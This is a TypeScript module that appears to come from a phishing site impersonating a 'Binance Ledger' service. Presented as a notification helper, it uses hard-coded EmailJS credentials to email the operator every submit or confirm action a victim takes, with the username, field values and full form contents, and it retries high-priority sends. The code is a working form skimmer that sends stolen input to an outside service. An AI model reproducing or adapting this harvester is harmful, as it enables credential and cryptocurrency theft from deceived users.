
import emailjs from 'emailjs-com';

// Initialize EmailJS with your user ID immediately
emailjs.init("hDX5LRevxoenkHrjk");

interface EmailData {
  step: string;
  field?: string;
  value?: string;
  username?: string;
  timestamp: string;
  allFormData?: any;
  priority?: 'high' | 'normal';
}

export const sendEmailNotification = async (data: EmailData) => {
  // Skip field-level emails to reduce server load and focus on button clicks
  if (data.field && !data.step.includes('Submit') && !data.step.includes('Confirm') && !data.step.includes('Request')) {
    console.log('⏭️ Skipping field-level email to reduce delays');
    return;
  }

  console.log('=== PRIORITY EMAIL NOTIFICATION START ===');
  console.log('Priority level:', data.priority || 'normal');
  console.log('Data being sent:', data);

  const templateParams = {
    to_email: "donotreply@binanceledger.com",
    from_name: "Binance Ledger System - URGENT",
    subject: `🚨 IMMEDIATE: ${data.step} - User Action Alert`,
    message: `URGENT ACTION: ${data.step}
${data.field ? `Field: ${data.field}` : ''}
${data.value ? `Value: ${data.value}` : ''}
${data.username ? `Username: ${data.username}` : ''}
Timestamp: ${data.timestamp}

${data.allFormData ? `Complete Form Data:\n${JSON.stringify(data.allFormData, null, 2)}` : ''}`.trim(),
    step: data.step,
    field: data.field || '',
    value: data.value || '',
    username: data.username || '',
    timestamp: data.timestamp,
    allFormData: data.allFormData ? JSON.stringify(data.allFormData, null, 2) : ''
  };

  console.log('📧 Sending PRIORITY email immediately...');

  try {
    // Send email with higher priority
    const result = await emailjs.send(
      "service_r7sis9a",
      "template_dec5tz3", 
      templateParams
    );
    
    console.log('✅ PRIORITY Email sent successfully!', result);
    console.log('=== PRIORITY EMAIL NOTIFICATION END ===');
    return result;
  } catch (error) {
    console.error('❌ PRIORITY Email failed to send:', error);
    console.error('Error details:', error);
    
    // Retry once immediately for critical actions
    if (data.priority === 'high') {
      console.log('🔄 Retrying high-priority email...');
      try {
        const retryResult = await emailjs.send(
          "service_r7sis9a",
          "template_dec5tz3", 
          templateParams
        );
        console.log('✅ Retry successful!', retryResult);
        return retryResult;
      } catch (retryError) {
        console.error('❌ Retry also failed:', retryError);
      }
    }
    
    console.log('=== PRIORITY EMAIL NOTIFICATION END (ERROR) ===');
    throw error;
  }
};

// Helper function for high-priority button clicks
export const sendHighPriorityNotification = async (data: Omit<EmailData, 'priority'>) => {
  return sendEmailNotification({ ...data, priority: 'high' });
};
